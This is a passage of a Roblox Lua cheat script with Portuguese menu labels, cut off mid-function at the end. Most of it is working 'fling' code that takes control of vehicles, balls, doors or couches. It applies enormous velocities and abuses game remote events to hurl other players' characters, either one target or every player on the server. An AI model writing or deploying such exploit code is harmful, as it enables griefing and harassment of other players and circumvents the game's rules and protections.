        findFirstChild9 = vehicles3:FindFirstChild(localPlayer2.Name .. "Car")

        if not findFirstChild9 then
          return
        else
          pcall(function()
            humanoidRootPart20.Anchored = true
            humanoidRootPart20.CFrame = CFrame.new(Vector3.new(-3358.85, 5.25, -521.95))

            task.wait(0.2)

            humanoidRootPart20.Velocity = Vector3.zero
            humanoidRootPart20.RotVelocity = Vector3.zero
            humanoidRootPart20.Anchored = false

            humanoid15:ChangeState(Enum.HumanoidStateType.Seated)
          end)

          local v91 = tick()

          while true do
            task.wait()

            if tick() - v91 > 10 then
              break
            end

            if humanoid15.Sit then
              for index28, value34 in ipairs(findFirstChild9:GetDescendants()) do
                local v92 = value34

                if v92:IsA("BasePart") then
                  v92.CanCollide = false
                  pcall(function() v92:SetNetworkOwner(nil) end)
                end
              end

              v5 = true

              connect = runService.Stepped:Connect(function()
                if not v5 then
                  return
                end

                for index29, value35 in ipairs(character9:GetDescendants()) do
                  if value35:IsA("BasePart") then
                    value35.CanCollide = false
                  end
                end
              end)

              v90 = tick()

              connect2 = runService.Heartbeat:Connect(function()
                if not v5 then
                  return
                end

                local humanoidRootPart21, vector4, humanoidRootPart22

                if not p16 or not p16.Character then
                  v5 = false
                  return
                else
                  humanoidRootPart21 = p16.Character:FindFirstChild("HumanoidRootPart")
                  local humanoid16 = p16.Character:FindFirstChild("Humanoid")

                  if not humanoidRootPart21 or not humanoid16 then
                    v5 = false
                    return
                  end

                  if not humanoidRootPart20 or not humanoid15 then
                    v5 = false
                    return
                  else
                    vector4 = Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))

                    pcall(function()
                      findFirstChild9:PivotTo(CFrame.new(humanoidRootPart21.Position + vector4) * CFrame.Angles(
                        math.rad(workspaceService.DistributedGameTime * 12000),
                        math.rad(workspaceService.DistributedGameTime * 15000),
                        math.rad(workspaceService.DistributedGameTime * 18000)
                      ))
                    end)

                    local v93 = false

                    for index30, value36 in ipairs(findFirstChild9:GetDescendants()) do
                      if (value36:IsA("Seat") or value36:IsA("VehicleSeat"))
                        and value36.Name ~= "VehicleSeat" then
                        if value36.Occupant == humanoid16 then
                          v93 = true
                          break
                        end
                      end
                    end

                    if v93 or tick() - v90 > 10 then
                      v5 = false

                      if connect then
                        connect:Disconnect()
                        connect = nil
                      end

                      if connect2 then
                        connect2:Disconnect()
                        connect2 = nil
                      end

                      pcall(function()
                        findFirstChild9:PivotTo(CFrame.new(Vector3.new(-76.6, -401.97, -84.26)))
                      end)

                      task.wait(0.5)
                      f6()

                      if character9 then
                        humanoidRootPart22 = character9:FindFirstChild("HumanoidRootPart")

                        if humanoidRootPart22 and position2 then
                          pcall(function()
                            humanoidRootPart22.Anchored = true
                            humanoidRootPart22.CFrame = CFrame.new(position2 + Vector3.new(0, 5, 0))

                            task.wait(0.2)

                            humanoidRootPart22.Velocity = Vector3.zero
                            humanoidRootPart22.RotVelocity = Vector3.zero
                            humanoidRootPart22.Anchored = false

                            if humanoid15 then
                              humanoid15:ChangeState(Enum.HumanoidStateType.GettingUp)
                            end
                          end)
                        end
                      end

                      if character9 then
                        for index31, value37 in ipairs(character9:GetDescendants()) do
                          if value37:IsA("BasePart") then
                            value37.CanCollide = true
                            value37.Velocity = Vector3.zero
                            value37.RotVelocity = Vector3.zero
                          end
                        end
                      end

                      local humanoid17 = character9 and character9:FindFirstChild("Humanoid")

                      if humanoid17 then
                        humanoid17:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                      end

                      for index32, value38 in ipairs(workspaceService:GetDescendants()) do
                        if value38:IsA("Seat") or value38:IsA("VehicleSeat") then
                          value38.Disabled = false
                        end
                      end

                      pcall(function()
                        replicatedStorage:WaitForChild("RE"):WaitForChild("1Clothe1s"):FireServer(
                          "CharacterSizeUp", 1
                        )
                      end)

                      if ativarFlingAddToggle then
                        ativarFlingAddToggle:Set(false)
                      end
                    end
                    return
                  end
                end
              end)
              return
            end
          end
        end
      end
    end
  end

  function f14(p17)
    if not p17 or not p17.Character or not localPlayer2.Character then
      return
    end

    local character10 = localPlayer2.Character or localPlayer2.CharacterAdded:Wait()
    local humanoid18 = character10:FindFirstChildOfClass("Humanoid")
    local humanoidRootPart23 = character10:FindFirstChild("HumanoidRootPart")
    local findFirstChild10, v94, v95

    if not humanoid18 or not humanoidRootPart23 then
      return
    else
      position2 = humanoidRootPart23.Position

      pcall(function()
        humanoidRootPart23.Anchored = true
        humanoidRootPart23.CFrame = CFrame.new(Vector3.new(1181.83, 76.08, -1158.83))

        task.wait(0.2)

        humanoidRootPart23.Velocity = Vector3.zero
        humanoidRootPart23.RotVelocity = Vector3.zero
        humanoidRootPart23.Anchored = false

        if humanoid18 then
          humanoid18:ChangeState(Enum.HumanoidStateType.GettingUp)
        end
      end)

      task.wait(0.5)
      f6()
      task.wait(1)
      local vehicles4 = workspaceService:FindFirstChild("Vehicles")

      if not vehicles4 then
        return
      else
        findFirstChild10 = vehicles4:FindFirstChild(localPlayer2.Name .. "Car")

        if not findFirstChild10 then
          return
        else
          pcall(function()
            humanoidRootPart23.Anchored = true
            humanoidRootPart23.CFrame = CFrame.new(Vector3.new(1176.56, 79.9, -1166.65))

            task.wait(0.2)

            humanoidRootPart23.Velocity = Vector3.zero
            humanoidRootPart23.RotVelocity = Vector3.zero
            humanoidRootPart23.Anchored = false

            humanoid18:ChangeState(Enum.HumanoidStateType.Seated)
          end)

          local v96 = tick()

          while true do
            task.wait()

            if tick() - v96 > 10 then
              break
            end

            if humanoid18.Sit then
              for index33, value39 in ipairs(findFirstChild10:GetDescendants()) do
                local v97 = value39

                if v97:IsA("BasePart") then
                  v97.CanCollide = false
                  pcall(function() v97:SetNetworkOwner(nil) end)
                end
              end

              v5 = true

              connect = runService.Stepped:Connect(function()
                if not v5 then
                  return
                end

                for index34, value40 in ipairs(character10:GetDescendants()) do
                  if value40:IsA("BasePart") then
                    value40.CanCollide = false
                  end
                end
              end)

              v94 = tick()
              v95 = 0

              connect2 = runService.Heartbeat:Connect(function()
                if not v5 then
                  return
                end

                local humanoidRootPart24, trailer, v98, bodyVelocity5, v99, humanoidRootPart25

                if not p17 or not p17.Character then
                  v5 = false
                  return
                else
                  humanoidRootPart24 = p17.Character:FindFirstChild("HumanoidRootPart")
                  local humanoid19 = p17.Character:FindFirstChild("Humanoid")

                  if not humanoidRootPart24 or not humanoid19 then
                    v5 = false
                    return
                  end

                  if not humanoidRootPart23 or not humanoid18 then
                    v5 = false
                    return
                  end

                  trailer = findFirstChild10:FindFirstChild("Body")
                    and findFirstChild10.Body:FindFirstChild("Trailer")

                  if not trailer then
                    return
                  else
                    v98 = math.sin(tick() * 30) * 5

                    pcall(function()
                      local vector5 = Vector3.new(0, v98, 0)
                      trailer:PivotTo(CFrame.new(humanoidRootPart24.Position + vector5))
                    end)

                    if (trailer.Position - humanoidRootPart24.Position).Magnitude < 5
                      and tick() - v95 > 0.4 then
                      v95 = tick()

                      for index35, value41 in ipairs(p17.Character:GetDescendants()) do
                        if value41:IsA("BasePart") then
                          value41.CanCollide = false
                        end
                      end

                      bodyVelocity5 = Instance.new("BodyVelocity")
                      bodyVelocity5.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                      bodyVelocity5.Velocity = Vector3.new(
                        math.random(-10, 10), 50, math.random(-10, 10)
                      ).Unit * 10000000 + Vector3.new(0, 5000000, 0)

                      bodyVelocity5.Parent = humanoidRootPart24

                      task.delay(0.5, function()
                        bodyVelocity5:Destroy()

                        for index36, value42 in ipairs(p17.Character:GetDescendants()) do
                          if value42:IsA("BasePart") then
                            value42.CanCollide = true
                          end
                        end
                      end)
                    end

                    local v100 = false

                    for index37, value43 in ipairs(findFirstChild10:GetDescendants()) do
                      if (value43:IsA("Seat") or value43:IsA("VehicleSeat"))
                        and value43.Name ~= "VehicleSeat" then
                        if value43.Occupant == humanoid19 then
                          v100 = true
                          break
                        end
                      end
                    end

                    if v100 or tick() - v94 > 10 then
                      v5 = false

                      if connect then
                        connect:Disconnect()
                        connect = nil
                      end

                      if connect2 then
                        connect2:Disconnect()
                        connect2 = nil
                      end

                      pcall(function()
                        findFirstChild10:PivotTo(CFrame.new(Vector3.new(
                          -59599.73, 2040070.5, -293391.16
                        )))
                      end)

                      task.wait(0.5)
                      f6()
                      v99 = { "DeleteAllVehicles" }

                      pcall(function()
                        replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v99))
                      end)

                      if character10 then
                        humanoidRootPart25 = character10:FindFirstChild("HumanoidRootPart")

                        if humanoidRootPart25 and position2 then
                          pcall(function()
                            humanoidRootPart25.Anchored = true
                            humanoidRootPart25.CFrame = CFrame.new(position2 + Vector3.new(0, 5, 0))

                            task.wait(0.2)

                            humanoidRootPart25.Velocity = Vector3.zero
                            humanoidRootPart25.RotVelocity = Vector3.zero
                            humanoidRootPart25.Anchored = false

                            if humanoid18 then
                              humanoid18:ChangeState(Enum.HumanoidStateType.GettingUp)
                            end
                          end)
                        end
                      end

                      if character10 then
                        for index38, value44 in ipairs(character10:GetDescendants()) do
                          if value44:IsA("BasePart") then
                            value44.CanCollide = true
                            value44.Velocity = Vector3.zero
                            value44.RotVelocity = Vector3.zero
                          end
                        end
                      end

                      local humanoid20 = character10 and character10:FindFirstChild("Humanoid")

                      if humanoid20 then
                        humanoid20:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                      end

                      for index39, value45 in ipairs(workspaceService:GetDescendants()) do
                        if value45:IsA("Seat") or value45:IsA("VehicleSeat") then
                          value45.Disabled = false
                        end
                      end

                      pcall(function()
                        replicatedStorage:WaitForChild("RE"):WaitForChild("1Clothe1s"):FireServer(
                          "CharacterSizeUp", 1
                        )
                      end)

                      if ativarFlingAddToggle then
                        ativarFlingAddToggle:Set(false)
                      end
                    end
                    return
                  end
                end
              end)
              return
            end
          end
        end
      end
    end
  end

  ativarFlingAddToggle = tab3:AddToggle({
    Name = "Ativar Fling",
    Description = "Ativa ou desativa o fling com o mÃ©todo selecionado",
    Default = false,
    Callback = function(value46)
      if value46 then
        if v3 or v4 or v5 then
          ativarFlingAddToggle:Set(false)
          return
        end

        if v8 == "SofÃ¡" then
          f17(findFirstChild)
        elseif v8 == "Bola" then
          f11(findFirstChild)
        elseif v8 == "Bola V2" then
          f12(findFirstChild)
        elseif v8 == "Barco" then
          f13(findFirstChild)
        elseif v8 == "CaminhÃ£o" then
          f14(findFirstChild)
        elseif v8 == "Ã”nibus" then
          f10(findFirstChild)
        end
        return
      end

      f9()
    end,
  })

  tab3:AddSection({ " fling ALL e desligue os RGB antes de usar" })
  orbitando = false
  orbitConn = nil
  allFling = false

  function f15(p18)
    local lower = p18:lower()

    for index40, value47 in ipairs(players:GetPlayers()) do
      if value47.Name:lower():find(lower) then
        return value47
      end
    end

    return nil
  end

  allConn = nil
  currentPlayerList = nil
  currentPlayerIndex = nil
  lastSwitchTime = nil
  allFling2 = false
  allConn2 = nil
  findFirstChild2 = nil
  v6 = nil
  excludedPlayers = {}

  tab3:AddTextBox({
    Name = "adicionar jogador na whaitelist",
    Description = "Digite parte do nome do jogador",
    PlaceholderText = "Ex.: rt para (player123)",
    Callback = function(value48)
      if value48 == "" then
        return
      else
        local v101 = f15(value48)

        if v101 then
          for index41, value49 in ipairs(excludedPlayers) do
            if value49 == v101 then
              return
            end
          end

          table.insert(excludedPlayers, v101)
          return
        end
      end
    end,
  })

  tab3:AddButton({
    "Verificar ExcluÃ­dos",
    function()
      if #excludedPlayers == 0 then
        return
      end

      for index42, value50 in ipairs(excludedPlayers) do
        task.wait(0.5)
      end
    end,
  })

  tab3:AddButton({
    "Remover ExcluÃ­dos",
    function()
      if #excludedPlayers == 0 then
        return
      end

      excludedPlayers = {}
    end,
  })

  tab3:AddButton({
    "Bola Fling Orbitando",
    function()
      local character11, humanoidRootPart26

      if orbitando then
        return
      elseif not f22() then
        return
      else
        task.wait(0.5)
        character11 = localPlayer2.Character or localPlayer2.CharacterAdded:Wait()
        humanoidRootPart26 = character11:FindFirstChild("HumanoidRootPart")

        if not humanoidRootPart26 then
          return
        else
          local workspaceCom3 = workspaceService:FindFirstChild("WorkspaceCom")

          local findFirstChild11 = workspaceCom3
            and workspaceCom3:FindFirstChild("001_SoccerBalls")

          findFirstChild2 = findFirstChild11
            and findFirstChild11:FindFirstChild("Soccer" .. localPlayer2.Name)

          if not findFirstChild2 then
            return
          else
            v6 = {
              Anchored = findFirstChild2.Anchored,
              CanCollide = findFirstChild2.CanCollide,
              CanTouch = findFirstChild2.CanTouch,
            }

            findFirstChild2.Anchored = false
            findFirstChild2.CanCollide = true
            findFirstChild2.CanTouch = true

            pcall(function() findFirstChild2:SetNetworkOwner(nil) end)
            orbitando = true

            orbitConn = runService.Heartbeat:Connect(function()
              if not orbitando or not findFirstChild2 or not findFirstChild2.Parent
                or not humanoidRootPart26 or not humanoidRootPart26.Parent or not character11
                or not character11.Parent then
                if orbitConn then
                  orbitConn:Disconnect()
                  orbitConn = nil
                end

                orbitando = false

                if findFirstChild2 and v6 then
                  findFirstChild2.Anchored = v6.Anchored
                  findFirstChild2.CanCollide = v6.CanCollide
                  findFirstChild2.CanTouch = v6.CanTouch
                end

                findFirstChild2 = nil
                v6 = nil
                return
              else
                local v104 = tick() * 10
                local v105 = math.cos(v104)
                local v106 = math.sin(v104)
                local vector6 = Vector3.new(v105 * 3, -1, v106 * 3)

                findFirstChild2.CFrame = CFrame.new(humanoidRootPart26.Position + vector6)
                findFirstChild2.AssemblyLinearVelocity = Vector3.new(9999, 9999, 9999)
                return
              end
            end)
          end
        end
      end
    end,
  })

  tab3:AddButton({
    "Fling Bola ALL V1",
    function()
      local f32, v107

      if allFling then
        return
      elseif not f22() then
        return
      else
        task.wait(0.5)
        v107 = { "PlayerWantsToDeleteTool", "SoccerBall" }

        pcall(function()
          replicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(v107))
        end)

        local workspaceCom4 = workspaceService:FindFirstChild("WorkspaceCom")

        local findFirstChild12 = workspaceCom4
          and workspaceCom4:FindFirstChild("001_SoccerBalls")

        findFirstChild2 = findFirstChild12
          and findFirstChild12:FindFirstChild("Soccer" .. localPlayer2.Name)

        if not findFirstChild2 then
          return
        else
          v6 = {
            Anchored = findFirstChild2.Anchored,
            CanCollide = findFirstChild2.CanCollide,
            CanTouch = findFirstChild2.CanTouch,
          }

          findFirstChild2.Anchored = false
          findFirstChild2.CanCollide = true
          findFirstChild2.CanTouch = true

          pcall(function() findFirstChild2:SetNetworkOwner(nil) end)

          function f32()
            local v108 = {}

            for index43, value51 in ipairs(players:GetPlayers()) do
              local v109 = false

              for index44, value52 in ipairs(excludedPlayers) do
                if value51 == value52 then
                  v109 = true
                  break
                end
              end

              if value51 ~= localPlayer2 and not v109 and value51.Character
                and value51.Character:FindFirstChild("HumanoidRootPart") then
                table.insert(v108, value51)
              end
            end

            local v110 = #v108 - -1

            while true do
              v110 = -1 + v110

              if not (v110 >= 2 or false) then
                break
              end

              local v111 = v110
              local v112 = math.random(v111)
              local v113 = v108[v111]

              v108[v111] = v108[v112]
              v108[v112] = v113
            end

            return v108
          end

          allFling = true

          allConn = runService.Heartbeat:Connect(function()
            if not allFling or not findFirstChild2 or not findFirstChild2.Parent then
              if allConn then
                allConn:Disconnect()
                allConn = nil
              end

              allFling = false

              if findFirstChild2 and v6 then
                findFirstChild2.Anchored = v6.Anchored
                findFirstChild2.CanCollide = v6.CanCollide
                findFirstChild2.CanTouch = v6.CanTouch
              end

              findFirstChild2 = nil
              v6 = nil
              currentPlayerList = nil
              currentPlayerIndex = nil
              lastSwitchTime = nil
              return
            end

            if not currentPlayerList or #currentPlayerList == 0 then
              currentPlayerList = f32()
              currentPlayerIndex = 1
              lastSwitchTime = tick()
            end

            local vector7, bodyVelocity6

            if #currentPlayerList == 0 then
              return
            else
              if tick() - lastSwitchTime >= 4 then
                currentPlayerIndex = currentPlayerIndex + 1

                if currentPlayerIndex > #currentPlayerList then
                  currentPlayerList = f32()
                  currentPlayerIndex = 1
                end

                lastSwitchTime = tick()
              end

              local v114 = currentPlayerList[currentPlayerIndex]

              if not v114 or not v114.Character then
                return
              else
                local character12 = v114.Character

                if character12 and character12:FindFirstChild("HumanoidRootPart")
                  and character12:FindFirstChild("Humanoid") then
                  local humanoidRootPart27 = character12.HumanoidRootPart
                  local humanoid21 = character12.Humanoid
                  local magnitude2 = humanoidRootPart27.Velocity.Magnitude
                  local v115 = humanoid21:GetState() == Enum.HumanoidStateType.Jumping

                  if humanoid21.MoveDirection.Magnitude > 0.05 or v115 then
                    vector7 = humanoidRootPart27.CFrame.LookVector
                        * math.clamp(magnitude2 / 1.5, 6, 18)
                      + Vector3.new(0, 1, 0)
                  else
                    local v116 = tick()
                    local v117 = math.sin(v116 * 25)
                    local v118 = tick()
                    local v119 = math.cos(v118 * 20)
                    vector7 = Vector3.new(v119 * 1.5, 1, v117 * 4)
                  end

                  findFirstChild2.CFrame = CFrame.new(humanoidRootPart27.Position + vector7)
                  findFirstChild2.AssemblyLinearVelocity = Vector3.new(9999, 9999, 9999)

                  if (findFirstChild2.Position - humanoidRootPart27.Position).Magnitude < 4 then
                    bodyVelocity6 = Instance.new("BodyVelocity")
                    bodyVelocity6.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                    bodyVelocity6.Velocity = Vector3.new(
                      math.random(-5, 5), 5, math.random(-5, 5)
                    ).Unit * 500000 + Vector3.new(0, 250000, 0)

                    bodyVelocity6.Parent = humanoidRootPart27

                    task.delay(0.3, function() bodyVelocity6:Destroy() end)
                  end
                end
                return
              end
            end
          end)
        end
      end
    end,
  })

  tab3:AddButton({
    "Fling Bola ALL V2",
    function()
      local v120

      if allFling2 then
        return
      elseif not f22() then
        return
      else
        task.wait(0.5)
        v120 = { "PlayerWantsToDeleteTool", "SoccerBall" }

        pcall(function()
          replicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(v120))
        end)

        local workspaceCom5 = workspaceService:FindFirstChild("WorkspaceCom")

        local findFirstChild13 = workspaceCom5
          and workspaceCom5:FindFirstChild("001_SoccerBalls")

        findFirstChild2 = findFirstChild13
          and findFirstChild13:FindFirstChild("Soccer" .. localPlayer2.Name)

        if not findFirstChild2 then
          return
        else
          v6 = {
            Anchored = findFirstChild2.Anchored,
            CanCollide = findFirstChild2.CanCollide,
            CanTouch = findFirstChild2.CanTouch,
          }

          findFirstChild2.Anchored = false
          findFirstChild2.CanCollide = true
          findFirstChild2.CanTouch = true

          pcall(function() findFirstChild2:SetNetworkOwner(nil) end)
          allFling2 = true

          allConn2 = runService.Heartbeat:Connect(function()
            local v121 = not allFling2 or not findFirstChild2 or not findFirstChild2.Parent
            local vector8

            if v121 then
              if allConn2 then
                allConn2:Disconnect()
                allConn2 = nil
              end

              allFling2 = false

              if findFirstChild2 and v6 then
                findFirstChild2.Anchored = v6.Anchored
                findFirstChild2.CanCollide = v6.CanCollide
                findFirstChild2.CanTouch = v6.CanTouch
              end

              findFirstChild2 = nil
              v6 = nil
              return
            else
              local v122 = {}

              for index45, value53 in ipairs(players:GetPlayers()) do
                local v123 = false

                for index46, value54 in ipairs(excludedPlayers) do
                  if value53 == value54 then
                    v123 = true
                    break
                  end
                end

                if value53 ~= localPlayer2 and not v123 and value53.Character
                  and value53.Character:FindFirstChild("HumanoidRootPart") then
                  table.insert(v122, value53)
                end
              end

              local v124 = #v122 - -1

              while true do
                v124 = -1 + v124

                if not (v124 >= 2 or false) then
                  break
                end

                local v125 = v124
                local v126 = math.random(v125)
                local v127 = v122[v125]

                v122[v125] = v122[v126]
                v122[v126] = v127
              end

              for index47, value55 in ipairs(v122) do
                if not allFling2 then
                  break
                else
                  local character13 = value55.Character

                  if character13 and character13:FindFirstChild("HumanoidRootPart")
                    and character13:FindFirstChild("Humanoid") then
                    local humanoidRootPart28 = character13.HumanoidRootPart
                    local humanoid22 = character13.Humanoid
                    local magnitude3 = humanoidRootPart28.Velocity.Magnitude
                    local v128 = humanoid22:GetState() == Enum.HumanoidStateType.Jumping

                    if humanoid22.MoveDirection.Magnitude > 0.05 or v128 then
                      vector8 = humanoidRootPart28.CFrame.LookVector
                          * math.clamp(magnitude3 / 1.5, 6, 18)
                        + Vector3.new(0, 1, 0)
                    else
                      local v129 = tick()
                      local v130 = math.sin(v129 * 25)
                      local v131 = tick()
                      local v132 = math.cos(v131 * 20)
                      vector8 = Vector3.new(v132 * 1.5, 1, v130 * 4)
                    end

                    findFirstChild2.CFrame = CFrame.new(humanoidRootPart28.Position + vector8)
                    findFirstChild2.AssemblyLinearVelocity = Vector3.new(9999, 9999, 9999)

                    if (findFirstChild2.Position - humanoidRootPart28.Position).Magnitude < 4 then
                      local bodyVelocity7 = Instance.new("BodyVelocity")
                      bodyVelocity7.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                      bodyVelocity7.Velocity = Vector3.new(
                        math.random(-5, 5), 5, math.random(-5, 5)
                      ).Unit * 1000000 + Vector3.new(0, 1000000, 0)

                      bodyVelocity7.Parent = humanoidRootPart28

                      task.delay(0.3, function() bodyVelocity7:Destroy() end)
                    end
                  end
                  task.wait(0.1)
                end
              end
            end
          end)
        end
      end
    end,
  })

  tab3:AddButton({
    "Parar Tudo",
    function()
      orbitando = false

      if orbitConn then
        orbitConn:Disconnect()
        orbitConn = nil
      end

      allFling = false

      if allConn then
        allConn:Disconnect()
        allConn = nil
      end

      currentPlayerList = nil
      currentPlayerIndex = nil
      lastSwitchTime = nil
      allFling2 = false

      if allConn2 then
        allConn2:Disconnect()
        allConn2 = nil
      end

      if findFirstChild2 and v6 then
        findFirstChild2.Anchored = v6.Anchored
        findFirstChild2.CanCollide = v6.CanCollide
        findFirstChild2.CanTouch = v6.CanTouch
      end

      findFirstChild2 = nil
      v6 = nil
    end,
  })

  tab4:AddSection({ "funÃ§Ã£o" })

-- ═══════════════════════════════════════════════════════════════════════
-- [MOON HUB] FUNÇÕES EXTRAS DO GTVZ (adaptadas)
-- ═══════════════════════════════════════════════════════════════════════

tab3:AddSection({ "Fling por Click (Mobile)" })

-- ═══════════════════════════════════════════════════════════════════════
-- FLING PORTA CLICK
-- ═══════════════════════════════════════════════════════════════════════
tab3:AddButton({
  Name = "FLING PORTA CLICK",
  Description = "Fique perto das portas e TOQUE no alvo",
  Callback = function()
    local P = game:GetService("Players")
    local W = game:GetService("Workspace")
    local RS = game:GetService("RunService")
    local UIS = game:GetService("UserInputService")

    local lp = P.LocalPlayer
    local char = lp.Character or lp.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")

    local blackHole = Instance.new("Part")
    blackHole.Size = Vector3.new(100000, 100000, 100000)
    blackHole.Transparency = 1
    blackHole.Anchored = true
    blackHole.CanCollide = false
    blackHole.Name = "BlackHoleTarget"
    blackHole.Parent = W

    local baseAtt = Instance.new("Attachment")
    baseAtt.Name = "Luscaa_BlackHoleAttachment"
    baseAtt.Parent = blackHole

    RS.Heartbeat:Connect(function()
      blackHole.CFrame = hrp.CFrame
    end)

    local doors = {}

    local function setupPart(part)
      if not part:IsA("BasePart") or part.Anchored or not string.find(part.Name, "Door") then return end
      if part:FindFirstChild("Luscaa_Attached") then return end

      part.CanCollide = false

      for _, o in ipairs(part:GetChildren()) do
        if o:IsA("AlignPosition") or o:IsA("Torque") or o:IsA("Attachment") then o:Destroy() end
      end

      local m = Instance.new("BoolValue", part)
      m.Name = "Luscaa_Attached"

      local a1 = Instance.new("Attachment", part)

      local align = Instance.new("AlignPosition", part)
      align.Attachment0 = a1
      align.Attachment1 = baseAtt
      align.MaxForce = 1e20
      align.MaxVelocity = math.huge
      align.Responsiveness = 99999

      local torque = Instance.new("Torque", part)
      torque.Attachment0 = a1
      torque.RelativeTo = Enum.ActuatorRelativeTo.World
      torque.Torque = Vector3.new(
        math.random(-10e5, 10e5) * 10000,
        math.random(-10e5, 10e5) * 10000,
        math.random(-10e5, 10e5) * 10000
      )

      table.insert(doors, {Part = part, Align = align})
    end

    for _, obj in ipairs(W:GetDescendants()) do
      if obj:IsA("BasePart") and string.find(obj.Name, "Door") then setupPart(obj) end
    end

    W.DescendantAdded:Connect(function(obj)
      if obj:IsA("BasePart") and string.find(obj.Name, "Door") then setupPart(obj) end
    end)

    local function flingPlayer(plr)
      local c = plr.Character
      if not c then return end
      local tHRP = c:FindFirstChild("HumanoidRootPart")
      if not tHRP then return end

      local tAtt = tHRP:FindFirstChild("SHNMAX_TargetAttachment")
      if not tAtt then
        tAtt = Instance.new("Attachment", tHRP)
        tAtt.Name = "SHNMAX_TargetAttachment"
      end

      for _, d in ipairs(doors) do
        if d.Align then d.Align.Attachment1 = tAtt end
      end

      local start = tick()
      while tick() - start < 5 do
        if tHRP.Velocity.Magnitude >= 20 then break end
        RS.Heartbeat:Wait()
      end

      for _, d in ipairs(doors) do
        if d.Align then d.Align.Attachment1 = baseAtt end
      end
    end

    UIS.TouchTap:Connect(function(pos, processed)
      if processed then return end
      local p = pos[1]
      local cam = W.CurrentCamera
      local ray = cam:ScreenPointToRay(p.X, p.Y)
      local hit = W:Raycast(ray.Origin, ray.Direction * 1000)

      if hit and hit.Instance then
        local plr = P:GetPlayerFromCharacter(hit.Instance:FindFirstAncestorOfClass("Model"))
        if plr and plr ~= lp then flingPlayer(plr) end
      end
    end)
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- FLING SOFA CLICK (mobile)
-- ═══════════════════════════════════════════════════════════════════════
tab3:AddButton({
  Name = "FLING SOFA CLICK",
  Description = "Toque no alvo para flingar com sofá",
  Callback = function()
    local P = game:GetService("Players")
    local R = game:GetService("ReplicatedStorage")
    local UIS = game:GetService("UserInputService")
    local eu = P.LocalPlayer
    local cam = workspace.CurrentCamera

    local podeClicar = true
    local equipado = false
    local NOME = "Click Fling Couch"

    local mochila = eu:WaitForChild("Backpack")

    if not mochila:FindFirstChild(NOME) and not (eu.Character and eu.Character:FindFirstChild(NOME)) then
      local tool = Instance.new("Tool")
      tool.Name = NOME
      tool.RequiresHandle = false
      tool.CanBeDropped = false
      tool.Equipped:Connect(function() equipado = true end)
      tool.Unequipped:Connect(function() equipado = false end)
      tool.Parent = mochila
    end

    local function jogarComSofa(alvo)
      if not equipado then return end
      if not alvo or not alvo.Character or alvo == eu then return end

      local jogando = true
      local raiz = eu.Character and eu.Character:FindFirstChild("HumanoidRootPart")
      local alvoRaiz = alvo.Character and alvo.Character:FindFirstChild("HumanoidRootPart")
      if not raiz or not alvoRaiz then return end

      local boneco = eu.Character
      local humano = boneco:FindFirstChildOfClass("Humanoid")
      local posOriginal = raiz.CFrame

      R:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
      task.wait(0.2)
      R.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
      task.wait(0.3)

      local sofa = eu.Backpack:FindFirstChild("Couch")
      if sofa then sofa.Parent = boneco end
      task.wait(0.1)

      game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
      task.wait(0.25)

      workspace.FallenPartsDestroyHeight = 0/0

      local forca = Instance.new("BodyVelocity")
      forca.Velocity = Vector3.new(9e8, 9e8, 9e8)
      forca.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
      forca.Parent = raiz

      humano:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
      cam.CameraSubject = alvo.Character:FindFirstChild("Head") or alvoRaiz or humano

      task.spawn(function()
        local ang = 0
        while jogando and alvo and alvo.Character and alvo.Character:FindFirstChildOfClass("Humanoid") do
          local aH = alvo.Character:FindFirstChildOfClass("Humanoid")
          if aH.Sit then break end
          ang = ang + 50
          local hrp = alvo.Character.HumanoidRootPart
          local pos = hrp.Position + hrp.Velocity / 1.5
          raiz.CFrame = CFrame.new(pos) * CFrame.Angles(math.rad(ang), 0, 0)
          raiz.Velocity = Vector3.new(9e8, 9e8, 9e8)
          raiz.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
          task.wait()
        end
        jogando = false
        forca:Destroy()
        humano:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        humano.PlatformStand = false
        raiz.CFrame = posOriginal
        cam.CameraSubject = humano
        humano:UnequipTools()
        R.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
      end)

      while jogando do task.wait() end
    end

    UIS.TouchTap:Connect(function(toques, proc)
      if proc or not podeClicar or not equipado then return end
      local pos = toques[1]
      local raio = cam:ScreenPointToRay(pos.X, pos.Y)
      local acerto = workspace:Raycast(raio.Origin, raio.Direction * 1000)
      if acerto and acerto.Instance then
        local alvo = P:GetPlayerFromCharacter(acerto.Instance:FindFirstAncestorOfClass("Model"))
        if alvo and alvo ~= eu then
          podeClicar = false
          jogarComSofa(alvo)
          task.delay(2, function() podeClicar = true end)
        end
      end
    end)
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- FLING BOLA CLICK (mobile)
-- ═══════════════════════════════════════════════════════════════════════
tab3:AddButton({
  Name = "FLING BOLA CLICK",
  Description = "Toque no alvo para flingar com bola",
  Callback = function()
    local P = game:GetService("Players")
    local R = game:GetService("ReplicatedStorage")
    local W = game:GetService("Workspace")
    local UIS = game:GetService("UserInputService")
    local cam = W.CurrentCamera
    local eu = P.LocalPlayer

    local NOME = "Click Fling Ball"
    local equipado = false
    local mochila = eu:WaitForChild("Backpack")

    if not mochila:FindFirstChild(NOME) then
      local tool = Instance.new("Tool")
      tool.Name = NOME
      tool.RequiresHandle = false
      tool.CanBeDropped = false
      tool.Equipped:Connect(function() equipado = true end)
      tool.Unequipped:Connect(function() equipado = false end)
      tool.Parent = mochila
    end

    local function FlingBall(target)
      local player = P.LocalPlayer
